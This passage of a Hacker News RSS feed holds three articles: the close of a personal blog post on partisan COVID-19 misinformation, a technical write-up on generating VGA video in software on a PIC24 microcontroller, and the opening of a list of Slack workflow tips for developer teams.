Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">science</a> were not least among them. Frankly, I just shut down when it came to politics. The news was too negative and depressing. I got off social media as well, burying my head in work, doing the mental equivalent of “la-la-la” with fingers in my ears for three years.</p>



<p id="block-6b03038c-9c83-457c-9309-918c951f7cbc">That was until the <a href="https://realscience.community/wiki/covid-19-pandemic/" target="_blank" title="From Wikipedia, the free encyclopedia. COVID‑19 pandemicConfirmed cases per 100,000 population as of 8 August 2020&nbsp;&nbsp;>3,000&nbsp;&nbsp;1,000–3,000&nbsp;&nbsp;300–1,000&nbsp;&nbsp;100–300&nbsp;&nbsp;30–100&nbsp;&nbsp;0–30&nbsp;&nbsp;None or no dataCases per countryDeaths per capitaClockwise, starting from top:A nurse caring for a COVID‑19 patient in an&nbsp;intensive care&nbsp;unit aboard a U.S. hospital shipDisinfection vehicles in TaiwanDonated medical supplies being received in the PhilippinesBurial in IranThe&nbsp;Italian government's outbreak task…">COVID-19 pandemic</a> hit and a strange thing happened. I re-engaged with politics with a whole new pair of eyes. It was pretty hard for me to ignore the pandemic, especially because I was so stringently locked down in my Cambridge apartment, working remotely, having very few people that I could see. I was desperate to make sense of things, desperate for some control over my life, desperate to make sure the people that I love are ok, and desperate for a hug. The pandemic also just happened to be aligned with many things that I have expertise in- medicine, data <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">science</a>, and virology. I am both a medical doctor (not practicing) and I have a PhD. I currently am a Computational Biologist at MIT. My undergraduate and postbac years were spent in virology labs. So I felt compelled to be back on Facebook, talking to friends about the Pandemic, trying to help people navigate it. But at the same time, I was still attempting to mostly ignore the lay press. I was reading almost exclusively <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">science</a> journals and analyzing data myself. And the odd thing is, I was coming to very different conclusions than many of my friends, most of whom are liberal and many of whom have PhDs or MDs or both. For the first time in my life, people were arguing with me and in some cases, <em>mad at me</em>, for what I was saying on Facebook, and it took me by surprise.</p>



<p id="block-87ecc4f7-17e6-4afe-8253-97bf0b9081c3">Here is an example of this, on March 20th, I posted this “New York is growing exponentially faster than Italy- 8x rise in 5 days- 16k cases- this is holy fucking shit level. Please shelter in place NY even if your government has been catastrophically slow at asking you to do so.” with some analysis that I had done from online databases- (screen shot below). Surprisingly, people on my Facebook page were pushing back with all sorts of untrue things- NY just has done more testing, UV light and hotter months will kill it, it’s not because of not shutting down- NY is just more crowded.</p>



<p id="block-02e564b2-41c3-4cdc-b13f-31658348dc2c">I was baffled. Where were they getting this from? None of this was true from my analysis.</p>



<figure id="block-dce67ef5-7bb3-48c1-a2f3-eb2574e48ead"><img src="https://realscience.community/wp-content/uploads/2020/08/March-20-black-boxes-1-576x1024.png" alt="This image has an empty alt attribute; its file name is March-20-black-boxes-1-576x1024.png"></figure><p id="block-74897d32-3107-48f6-9cdf-f85a125b8cbf">Turns out the answer is that they were getting their info from (and believing) NY Governor, Andrew Cuomo, through the mainstream liberal media. Below is a YouTube video of Cuomo’s press conference with Trump on March 18, 2020. At minute 20:31, he says the following: “As I’ve said every day, the more you test, the more positives you will find.” and “New York is the state that has the most number of cases. Again, you would have to correlate that to how many tests the other states are doing, because the more tests they’re doing, the more cases they will find.” and “Again, perspective, perspective, because we’re fighting the virus, we’re fighting fear. The fear is winning. And the fear is disconnected from the facts. Fear is an emotion. Emotion can often be disconnected from facts, and that’s what happening here.”</p>



<figure id="block-db6f72ec-3731-4558-822b-ea9dbb94c1a2"><img src="https://realscience.community/wp-content/uploads/2020/08/image-1-1024x591.png" alt="This image has an empty alt attribute; its file name is image-1-1024x591.png"></figure><p id="block-534c5863-748e-4e26-8f20-d0e60c0aa999">And this was quoted and propagated by the news-<a href="https://www.cnn.com/2020/03/21/politics/new-york-andrew-cuomo-coronavirus-spread/index.html">like CNN’s March 21st article</a> and <a href="https://www.nbcnews.com/news/us-news/coronavirus-cases-new-york-state-now-top-10-000-n1165626">NBC’s March 21st article</a> – “The more tests you take, the more positives you find,” he said, adding that New York is now conducting more tests per capita than China or South Korea.”</p>



<p id="block-e894bbf7-ef23-45c8-8cff-03fce469fe28"><strong>Why is this false information? or blue #fakesciencenews</strong></p>



<p id="block-e894bbf7-ef23-45c8-8cff-03fce469fe28">Because only symptomatic people were being tested. Health insurance wasn’t paying for people without symptoms to be tested (and still isn’t in most places). They were <strong>testing more BECAUSE more people were sick, NOT finding more cases because they were testing more.</strong> Also the percent positives and hospitalization rates were going up, proving that testing was not the reason for the increased number of cases.</p>



<p id="block-cc3eb2a1-ec9c-4417-a779-cf2c4bcbd7e0">I have to say, I have heard President Trump say these exact same things. The two of them, Trump and Cuomo, have pretty similar rhetoric.</p>



<p id="block-59df9799-baae-4608-ab83-e57e076ee46a">Cuomo also at that time, said that if you told him to shelter-in-place, he personally wouldn’t listen, he’d just go have fun instead. This is documented in this <a href="https://www.nbcnews.com/news/us-news/ny-gov-cuomo-says-no-new-york-city-s-shelter-n1162911">March 18th NBC article</a>:</p>







<p id="block-143b308e-8bd8-48c8-b918-dc73798bfe37">March 18, 2020, 12:58 PM EDT&nbsp;/&nbsp;Updated&nbsp;March 18, 2020, 3:46 PM EDT By&nbsp;Tom Winter and Corky Siemaszko</p>



<p id="block-bcab33e2-05e1-4ff0-a6bf-2ca6632c6612">New York Gov. Andrew Cuomo had some choice words Wednesday for New York City mayor Bill de Blasio’s proposal to effectively shut the city down to stop the spread of the coronavirus: Not a chance…</p>



<p id="block-6a86db55-108c-4762-ba17-c55f943cc351">Cuomo echoed that point later at a press conference saying, “it just can’t be New York City.”</p>



<p id="block-8e0ff99d-5fe9-4d0e-828b-cc1673a388d5">“I’m from Queens and if you tell me to shelter-in-place I’ll just go stay with my sister in Westchester (County) and have a good time,” he said.”</p>



<p id="block-180b71a6-053f-4db0-bbfb-c4d81fa4c838">So in summary, I got yelled at by my educated liberal friends for singling out NYC to shut down because the liberal media was quoting the dangerous and reckless rhetoric and decisions by Andrew Cuomo.</p>



<p id="block-ef1b178b-8509-4080-beb3-01a78ed937c9"><strong>Obviously, we know what happened in NYC after that– 30,000 people died because Cuomo didn’t shut down in time.</strong></p>



<p id="block-84af9b9a-cc0f-4136-94df-b79be61bfc5b">That was one example of many of the blue #fakesciencenews stories- aimed at saving Cuomo’s butt (or whatever the political agenda was) that was believed by liberals because it was from a liberal news source.</p>



<p id="block-83aabbcc-fff3-44bd-9c96-4011de750e97"><strong>What about the red #fakesciencenews?</strong></p>



<p id="block-03b83506-17cf-413d-bfae-447b54ab4e13">Beginning to understand the perspective of the right and how it was driven by fake <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">science</a> news was a real eye opener for me. The best example of this was a little later on in the pandemic during the first weeks of re-opening. I <strong>was VERY worried about the onslaught of rising cases that was about to happen and high-risk people not taking it seriously</strong>, including some of my own friends and family. There was a false narrative circulating that somehow the virus was just going to magically disappear, even though places still had lots of cases.</p>



<p id="block-deb3c9e4-4920-417b-b259-4651006f4031">This was being pushed by Trump, Pence, and the conservative media. They were downplaying the virus’s seriousness.</p>



<figure id="block-3d54e755-8904-47ff-b36c-df43995695af"><img src="https://realscience.community/wp-content/uploads/2020/08/covid-hoax.jpeg" alt="This image has an empty alt attribute; its file name is covid-hoax.jpeg"></figure><p id="block-f9b9c31a-4ff5-4824-b25a-12b49f9c5d4e">Trump and Pence were also vocally against masks at that time, including by example (see pic below). This was incredibly harmful and a lot of people died unnecessarily because of it.</p>



<figure id="block-48c238e1-81a3-4860-a333-3ff888c9354b"><img src="https://realscience.community/wp-content/uploads/2020/08/pence-no-mask-1024x512.jpeg" alt="This image has an empty alt attribute; its file name is pence-no-mask-1024x512.jpeg"></figure><p id="block-2b65c71e-ff78-49b0-8549-b210c168ef38">On June 12th, I posted this to AFS’s Facebook page in order to try and get public health messaging out to save lives:</p>



<figure id="block-fd0b05eb-e6cb-4c6f-9bd9-472229659f58"><img src="https://realscience.community/wp-content/uploads/2020/08/image-9-1024x986.png" alt="This image has an empty alt attribute; its file name is image-9-1024x986.png"></figure><p id="block-56720ed1-f5bf-4e0b-b2c0-e1a31abd3337">And the response from the right was illuminating. Below are some screen shots:</p>



<figure id="block-e4f73b51-fcdf-4162-b04c-284a785f6d22"><img src="https://realscience.community/wp-content/uploads/2020/08/image-4.png" alt="This image has an empty alt attribute; its file name is image-4.png"></figure><p id="block-194e16f8-52e1-46bc-a574-c13e1a46b8c0">What did I make of this? People were mad at Cuomo and rightfully so. I am outraged at his actions personally. People think the virus is a hoax. People are worried about the economy. People are pointing out the hypocrisy of the liberal media saying that protests don’t spread COVID but reopening does. Here are some more responses:</p>



<figure id="block-d6bf0481-f7e7-4c33-8563-f646a0127b0c"><img src="https://realscience.community/wp-content/uploads/2020/08/image-5.png" alt="This image has an empty alt attribute; its file name is image-5.png"></figure><p id="block-24310a82-4b4d-4c2f-b958-cf09cf49a8a0">That top one is just amazing (and racist of course, <strong>no excuses</strong> for that). More calling out of hypocrisy of protests vs. reopening.</p>



<figure id="block-4dfff567-169c-4b79-b1ef-40a8a8634f96"><img src="https://realscience.community/wp-content/uploads/2020/08/image-6.png" alt="This image has an empty alt attribute; its file name is image-6.png"></figure><p id="block-c2234e34-3785-43d2-a1d2-2284c3224d83">The above posts were my first introduction to the Bill Gates microchipping conspiracy theory and to Agenda 21. The top post does also have some valid points about confusion about death rates, unreliable tests, media induced hysteria, and bogus treatments that are killing people. And so I actually found myself agreeing with some of the things being said. And more importantly, I was starting to get why people would feel this way.</p>



<p id="block-3862550a-2b2e-4b15-b23c-7fe5afc0d3ed">People were also very confused and eager to talk about the math behind the death rates etc. When people realized that I wasn’t just some liberal propaganda bot, the convos were really very constructive on the whole. Below is one of the many back and forths I had about the math.</p>



<figure id="block-5a7eb5fe-42c5-4a26-ac5f-f561cdf37471"><img src="https://realscience.community/wp-content/uploads/2020/08/image-7.png" alt="This image has an empty alt attribute; its file name is image-7.png"></figure><p id="block-f87a41f9-28f9-4f55-91ac-9eaea11511e7">And people were scared. Especially older and higher risk people.</p>



<figure id="block-3a4815cc-25cb-4fa8-9f31-1e2fb7bfa2bb"><img src="https://realscience.community/wp-content/uploads/2020/08/image-8.png" alt="This image has an empty alt attribute; its file name is image-8.png"></figure><p>It became clear to me that any public health messaging needed to start with empathy and understanding. This pandemic is super scary for so many people.</p>



<p id="block-f86a2091-4c56-44c2-baa1-17f4971b7ed2">Perhaps …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://realscience.community/2020/08/25/how-i-entered-the-matrix-through-the-red-and-blue-fakesciencenews-and-came-out-purple/">https://realscience.community/2020/08/25/how-i-entered-the-matrix-through-the-red-and-blue-fakesciencenews-and-came-out-purple/</a></em></p>]]>
            </description>
            <link>https://realscience.community/2020/08/25/how-i-entered-the-matrix-through-the-red-and-blue-fakesciencenews-and-came-out-purple/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24272567</guid>
            <pubDate>Tue, 25 Aug 2020 15:49:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[VGA Signal (Software Generated, PIC24EP512GP202 Microcontroller)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24272519">thread link</a>) | @peter_d_sherman
<br/>
August 25, 2020 | http://www.voja.rs/PROJECTS/GAME_HTM/3.%20VGA.htm | <a href="https://web.archive.org/web/*/http://www.voja.rs/PROJECTS/GAME_HTM/3.%20VGA.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <td>
              <p>
			  <img height="515" src="http://www.voja.rs/PROJECTS/GAME_HTM/timings.gif" width="700">Video 
			  processors are not typically embedded in microcontrollers, so 
			  using the external video display unit is considered in gaming 
			  consoles. As this is the minimalistic project, VGA video signal is 
			  generated by software, based on interrupt driven kernel.</p>
			  <p>
			  &nbsp;The
              routine which generates VGA signal is the part of&nbsp;
			  <strong>T2</strong> (<b>Timer 2</b> module) interrupt service 
			  routine. This routine also services vertical sync pulse, markers 
			  for monitor auto adjustment and the bottom line text routine. At 
			  this version, no other interrupts are active, but the user can add 
			  his own interrupt sources, as long as they have the lower
              priority level.</p>
			  
			  <p>
			  <strong>Timing details</strong></p>
              <p>VGA
              timings for resolution <b> 800x600</b> in <b> 56Hz</b> refresh 
			  rate are represented on the drawing. Here are detailed
              timings data:</p>
              <p><u>Horizontal
              timing:</u></p>
              <p>Pixel clock: 36 MHz 
			  (13.89 ns)<br>
              Horizontal frequency/period: 35.16 KHz (28.44 us)<br>
              Visible area: 800 pixels (22.22 us)<br>
              Front porch: 24 pixels (0.67 us)<br>
              Sync pulse: 72 pixels (2 us)<br>
              Back porch: 128 pixels (3.56 us)</p>
              <p><u>Vertical
              timing:</u></p>
              <p>Vertical
              frequency/period: 56 Hz (17.86 ms)<br>
              Visible area: 600 lines (17.067 ms)<br>
              Front porch: 1 line (28.44 us)<br>
              Sync pulse: 2 lines (56.89 us)<br>
              Back porch: 22 lines (625.78 us)<br>
              Whole frame: 625 lines (17.78 ms)</p>
              <p>Dot clock for
              <b> 800x600</b> resolution <b> @ 56 Hz</b> vertical frequency is
              exactly <b> 36 MHz</b>, and the maximum execution speed for
			  <strong>PIC24E</strong> family is <strong>70 MIPS</strong>. So the 
			  MCU has to be slightly overclocked to <strong>72 MHz</strong> to 
			  get the desired instruction/pixel clock rate. This overclocking is 
			  only 2.8%, which is 
			  negligible and will not noticeable affect operational safety or thermal 
			  dissipation.</p>
			  <p>As it was noted, 
			  each pixel takes the place of 2x2 pixels area, so the actual dot clock is not 36 but 18 MHz. 
			  That gives enough time to the processor to execute four instructions 
			  in one pixel timing. In addition, every scan line is displayed 
			  twice, so there is even more time for buffer setup during 
			  horizontal sync and porches.</p>
			  
			<p>
			<strong>RAM organization</strong></p>
			<p>Video memory is 
			located in internal 
			48 KB RAM, where it occupies 45600 bytes. All video signal timings match VGA standard in <b> 800x600</b> mode, 
			but, due to RAM limitations, the actuual displayed resolution is only 
			<strong>380x240</strong>, and it is displayed on <strong>760x480</strong> 
			pixels original screen area.</p>
			<p>
			To use the whole <strong>800x600</strong> display area in 
			8-bit pixel mode, we need 800x600=<strong>480,000</strong> bytes of memory, but 
			in the best case, all that PIC microcontrollers offer at this 
			time is only 48K (<strong>49,152</strong> bytes), which is too far from what we need. There are some 16-bit PICs with 
			<strong>96K</strong> RAM, but they are too 
			slow for video signal generation, and some <strong>52K</strong> PICS, 
			but they are in SMD 64-pin packages with 0.5 mm pitch, which is 
			quite unconvenient for&nbsp; DIY projects. Although it is possible 
			to add external RAM, it is of no practical use, as the access to the 
			external RAM would be too slow. So we have to do it with 
			<strong>48K</strong> RAM MCUs somehow.</p>
			<p>
			To do that, we have to make some copromises:</p>
			<p>
			1. The colour of each pixel is defined by four bits only, so it works in 
			16-colour mode. In fact, only 15 colours are used, as one of them 
			(binary represened as 0000) does not mean "black" but "transparent", 
			which shalll be used in sprite handling. More about that later.</p>
			  <p>
			2. Each pixel from the video memory is displayed on 4-pixel (2x2) 
			area of the VGA screen.</p>
			<p>
			3. Actual displayed resolution is 380x240, which occupies 760x480 
			pixels on the screen. The 20 pixel wide margin on the top, left and 
			right side of the monitor are not used and are left black. At the 
			bottom there is one line (39 characters) of text. It needs no frame 
			buffer, as the routine interprets text directly from the text buffer in RAM.</p>
			<p>
			This organization gives 380x240=91,200 graphical pixels, but as 
			each pixel is covered by 4 bits, the video memory needs only 
			91,200/2=45,600 bytes of memory. Bottom line text needs no video 
			buffer and it occupies only 78 
			bytes (39 for text and 39 for colour attributes). So there are 
			49,152-45,678=3,474 free bytes, which is quite enough for housekeeping 
			(internal buffers and general purpose registers).</p>
			  
			  <p>
			  <strong>Sprites</strong></p>
			  <p>
			  With the processing power of 72 MIPS, it would be easy to generate the video signal 
			  by software, if 
			  the only requirement is to show the contents of video memory. As 
			  there is no video processing unit here and the MCU has to handle 
			  one pixel at a time, such concept would be useful for static 
			  images or very small movable blocks of pixels, but not for the 
			  game, which requires real time processing of large memory blocks. 
			  To make things worse, more than 1/3 of the time CPU is busy 
			  generating video signal, which leaves only 1/3 for housekeeping 
			  and active memory handling.</p>
			  <p>
			  The solution to this problem is to use <strong><em>sprites</em></strong>, 
			  which are 2D images located outside the video RAM, and somehow 
			  superimposed in the main scene. Video units in some of the first 
			  personal computers could handle sprites in hardware, but in this 
			  project it is realized in software. The sprites are in internal 
			  program memory of the MCU and they are combined with video RAM 
			  contents to generate the full video signal. That means that there 
			  is no way to manipulate the sprite contents, it can only be 
			  displayed at the desired location of the screen. As the most of characters in 
			  this game are animated, there is a large number of pixels, and 
			  each of them represents one frame of that pixel in the 
			  animation.&nbsp;Here is the example of Jack's jump. Note 
			  that X and Y absolute position on the screen is permanently 
			  adjusted during 
			  the jump, as well as the order of slides in the jump sequence 
			  (which is listed in the script table in the firmware), so it gives 
			  much more freedom in creating the <em>Mise en scène</em> for the 
			  game - this jump is, in reality, much higher and lasts longer than 
			  it may look while just watching those slides. So there is no need 
			  to draw the equal slides again, as each of them can be called repeatedly 
			  in the script table. In this example, the last five slides are 
			  repeated only because of the hair splash, otherwise slides 11, 12, 
			  13, 14 and 15 could be ommited and listed as 9, 8, 
			  6, 4 and 3 in the script. The same slides are used for jump up and 
			  for jump down to the lower floor, but with different script 
			  tables.</p>
			  <p>
					  <img height="90" src="http://www.voja.rs/PROJECTS/GAME_HTM/jump.gif" width="582"></p>
			  <p>
			  All that software has to do while servicing the video scenario, is 
			  to preset the special sprite registers, determining X and Y 
			  positions (relative to the left and upper border of the active 
			  portion of the screen), 
			  width and height of one slide image, and address of the current 
			  slide in program memory. Video firmware, located in the interrupt 
			  routine, will superimpose that sprite in the content of the 
			  background video memory during RGB signal generation.</p>
			  <p>
			&nbsp;One more thing to note is that the orange colour in sprites 
			  means "transparent" (there is no orange colour in the 
			  game pallete, only in the pallete of the PC drawing program during 
			  sprite design process). 
			  Each orange pixel on the sprite will be displayed from the video memory, which will 
			  typically hold the background image. Yet, there is one drawback of 
			  this princip. If two or more sprites are overlapping, then 
			  transparent (orange) pixels on the 
			  first of them (which holds the highest priority, that means which 
			  is located higher on the special sprite table in RAM) will partly covered 
			  the lower sprite, displaying the background instead of lower 
			  sprite's active pixels. The first (simulated) screenshot 
			  shows that example.</p>
			  <p>
			  <img height="105" src="http://www.voja.rs/PROJECTS/GAME_HTM/overlapping2.gif" width="831"></p>
			  <p>
			&nbsp;There is the way to solve this problem, but only for the 
			  limited number of sprites. Some sprites can be treated as 
			  "special", and they do not have that drawback (see the second screenshot). 
			  The only problem with those sprites is that they require 18 times 
			  more time for the video routine to execute, so programmer has to 
			  take care not to use this option if it is not necessarry, as it 
			  could result in losing scan lines on the screen.</p>
			  <p>
			  <img height="105" src="http://www.voja.rs/PROJECTS/GAME_HTM/overlapping1.gif" width="441"></p>
			  <p>
			&nbsp;How to tell to the video routine which sprite is special, and 
			  which is not? The sprite list (located in RAM and named SPRITELIST) holds 
			  pointers for active sprites. The video routine can place (or erase) any 
			  sprite at that list at any time, and at any table position which 
			  is not currently occupied. This table can hold the 
			  maximum of 20 sprites at the same time. Only four sprites (number 
			  17, 18, 19 and 20) are 
			  treated as "special" ones - they are executed much slower, but they 
			  do not generate the described problem in overlapping conflict, or 
			  at least it is minimized so that it is not noticeable. In 
			  this game, only one sprite (Jack itself) has that privilege, as 
			  the game scenario is such that all other sprites will never be 
			  overlapped.</p>
			  
			  <p>
			  <strong>Theory of operation</strong></p>
			  <p>
			  The most significant part of the video routine uses SPRITEBUFFER, 
			  which is 190 bytes long (equal to one scan line in video memory), 
			  and in which the video routine prepares the sprite contents for 
			  the …</p></td></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.voja.rs/PROJECTS/GAME_HTM/3.%20VGA.htm">http://www.voja.rs/PROJECTS/GAME_HTM/3.%20VGA.htm</a></em></p>]]>
            </description>
            <link>http://www.voja.rs/PROJECTS/GAME_HTM/3.%20VGA.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-24272519</guid>
            <pubDate>Tue, 25 Aug 2020 15:45:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Slack Hacks: 14 Ideas for Dev and DevOps Workflows in Slack via AWS, Twilio]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24272333">thread link</a>) | @jacksonpollock
<br/>
August 25, 2020 | https://cto.ai/blog/slack-hacks-14-ideas-for-developer-devops-workflows-slack-aws-twilio-lyft/ | <a href="https://web.archive.org/web/*/https://cto.ai/blog/slack-hacks-14-ideas-for-developer-devops-workflows-slack-aws-twilio-lyft/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			<!-- .cover -->
			<div>
				<p>Increasingly companies are bringing their entire workflows and data streams into Slack via apps, integrations, and APIs. Slack is currently reporting over <a href="https://kommandotech.com/statistics/slack-statistics/#:~:text=135%2C983%20companies%20are%20currently%20using,million%20people%20daily%20in%202019.">135,000 active companies</a> and that’s just the beginning amid a global rise of remote-first work.</p><p>Why this move to Slack? For millions of users, Slack is THE place for communication and collaboration. Slack is not just an email killer because it’s a novel form of communication. We already had SMS and WhatsApp. What Slack brings to the table is deeper-seated in company transparency and velocity.</p><p>Slack is seamlessly synchronous and asynchronous. It allows you to reduce context switching by creating a space for both short-form communication and long-form with a sprinkle of emoji-led authentic conversations and interactions. It also is beautifully designed.</p><p>Most importantly though, Slack brings in streams of information out of the countless siloed data sources in your consoles and Chrome browser tabs. It surfaces real-time and important metrics, queries, customer support tickets, PagerDuty downtime pings, and so much more. It’s become your dashboard for your company, team, and everything in between.</p><p>The average company loses <a href="https://slack.com/resources/why-use-slack/software-development-teams-and-slack">more than 20%</a> of its productive power to organizational drag. Put Slack in the picture though and development teams using Slack deliver 5% more output overall, with 23% faster time to market, 27% less time needed to test and iterate, and faster identification and resolution of engineering-related bugs, <a href="https://slack.com/resources/why-use-slack/software-development-teams-and-slack#">according to IDC research</a>.</p><p>Here at CTO.ai, we use a plethora of Slackbots and SlackOps to run our company. From our <a href="https://cto.ai/platform">Slack-first DevOps workflow automation platform</a> to Geekbot for company standups to the <a href="https://ops-community.slack.com/apps/A2RPP3NFR-jira-cloud">Jira chatbot</a> for our product roadmap to Greetbot to welcome new members of <a href="https://w.cto.ai/community">our Slack developer community</a>, we are believers that Slack is the key to fluid, meshed flow states that increase productivity and observability.</p><p>To say the least, we are big fans of Slack, but don’t take our word for it. Below are some Slack hacks, tips and tricks for developers and engineering teams of all ilks to get the most out of Slack. In no particular order, here are what DevOps and engineering workflows technical leaders are using in Slack:</p><!--kg-card-begin: html--><!--kg-card-end: html--><h2 id="-1-send-delayed-messages">#1 Send Delayed Messages</h2><h3 id="lizzie-sigal-developer-evangelist-twilio"><em><a href="https://www.linkedin.com/in/elsiegle/">Lizzie Sigal</a>, Developer Evangelist, Twilio</em></h3><p>“The <a href="https://ops-community.slack.com/apps/ANPGHD2F8-gator">Gator Slack app</a> lets you send delayed messages at 9am in the recipient's time zone so as to not notify them if they've logged off for the day. Convenient, more thoughtful, simple.”</p><!--kg-card-begin: html--><!--kg-card-end: html--><h2 id="-2-team-celebrations">#2 Team Celebrations</h2><h3 id="fletcher-richman-co-founder-ceo-halp-senior-product-manager-atlassian"><em><a href="https://twitter.com/fletchrichman?lang=en">Fletcher Richman</a>, Co-Founder/CEO Halp; Senior Product Manager, Atlassian</em></h3><p>“Every time a new customer signs up for Halp via Stripe, we post a gif to #halp-wins.” </p><p><em>Atlassian, <a href="https://techcrunch.com/2020/05/12/atlassian-acquires-halp-to-bring-slack-integration-to-the-forefront/">which acquired Halp</a>, also has <a href="https://statuspage.io/">Statuspage</a>, a chatbot with a full Slack integration that allows updating and maintaining your status page directly inside your ops chatroom.</em></p><!--kg-card-begin: html--><!--kg-card-end: html--><h3 id="daniel-hochman-platform-engineer-lyft"><em><a href="https://www.linkedin.com/in/danielhochman/">Daniel Hochman</a>, Platform Engineer, Lyft</em></h3><p>“<a href="https://eng.lyft.com/announcing-clutch-the-open-source-platform-for-infrastructure-tooling-143d00de9713">Clutch</a> ships with authentication and authorization components. OpenID Connect (OIDC) authentication flows for single-sign on, resource-level role-based access control (RBAC) via static mapping, and automatic auditing of all actions with the ability to run additional sinks for output, e.g., a Slackbot.”</p><!--kg-card-begin: html--><br><!--kg-card-end: html--><!--kg-card-begin: image--><figure><img src="https://lh4.googleusercontent.com/s0GcOYpOtfDNhE-jH7RyDcXo-uZQubyEZAyrdtTWYKpKibznvl4QezGLiTrhbNa4U_2XR2k_MHE8gKcyo2G2XM01ErSixY5k6kxU8Q2nj9NDp6T00ifdJo04qla74pph5DOfoS8"></figure><!--kg-card-end: image--><!--kg-card-begin: html--><!--kg-card-end: html--><h2 id="-4-reminders">#4 Reminders</h2><h3 id="don-burks-technical-lead-sphere"><em><a href="https://donburks.com/">Don Burks</a>, Technical Lead, Sphere</em></h3><p>“/remind is one of the biggest ones. Instead of having to break flow from my keyboard and write something down, I can get Slack to remind me.”</p><p>(I personally enjoy CMD K for quick searching and /collapse for minimizing all those extra pop-ups from Slack integrations.)</p><!--kg-card-begin: html--><!--kg-card-end: html--><h2 id="-5-wins-failure-alerts-retros-standups">#5 Wins, Failure Alerts, Retros, Standups</h2><h3 id="brice-pollock-senior-ios-engineer-betterup"><em><a href="http://www.bricepollock.com/">Brice Pollock</a>, Senior iOS Engineer, BetterUp</em></h3><ul><li>Looking for a way to give sales organizations more visibility to product teams? Use the <a href="https://slack.com/help/articles/227838227-Salesforce-for-Slack">Salesforce integration</a> for closed opportunities in #general.</li><li>Looking for a way to get more insight into build failures? Use a CircleCI integration in a Slack channel that reports build failures.</li><li>Looking for a way to get more insight into runtime failures? Use a <a href="https://support.google.com/firebase/answer/9005934">Firebase integration</a> in a Slack channel that reports changes in thresholds for fatals and non-fatals.</li><li>Looking for a way to help with Team Retros? Pin a poll to a Slack channel and use a slash reminder command (/remind) to get the team to enter responses prior to retro.</li><li>Looking for a way to automate standup? Integrate Jira and Confluence so a new standup doc is generated every day with a random ice breaker question in a randomized standup order.</li><li>Looking for a way to highlight SWAT or blocking issues? Create a macro that like reminders will print all blockers right before standup and anyone on the team can add a blocker or discussion topic.</li></ul><!--kg-card-begin: html--><!--kg-card-end: html--><h2 id="-6-website-metrics">#6 Website Metrics</h2><h3 id="frances-coronel-executive-director-techqueria"><em>Frances Coronel, Executive Director, <a href="https://techqueria.org/">Techqueria</a></em></h3><p>“Website metrics are a way we measure impact and we use Arc to bring Google Analytics to us automatically each week and with a cumulative monthly update instead of having to manually go into there. It's so easy to update our partnerships deck and impact report with the latest numbers.”</p><!--kg-card-begin: image--><figure><img src="https://lh4.googleusercontent.com/fZKgM1bwrrtm8o2ui1T4kaeC35c9wNGB0VkNYkGybp0uykh1npMX-OUkZRo7r-bMriqc6htXbzs18wqFdxqj-rhnOLo_DMCpt_yESqGehTop-bSqN5zYgpfC6NIJ-swfC5LyxSk"></figure><!--kg-card-end: image--><!--kg-card-begin: html--><!--kg-card-end: html--><h2 id="-7-product-support">#7 Product Support</h2><h3 id="vlad-shlosberg-ceo-foqal-io"><em>Vlad Shlosberg, CEO, <a href="https://www.foqal.io/">Foqal.io</a></em></h3><p>“Immediate access to your customers and conversion to become a customer. With this Slack bot, it made our support process a lot more manageable.”</p><!--kg-card-begin: 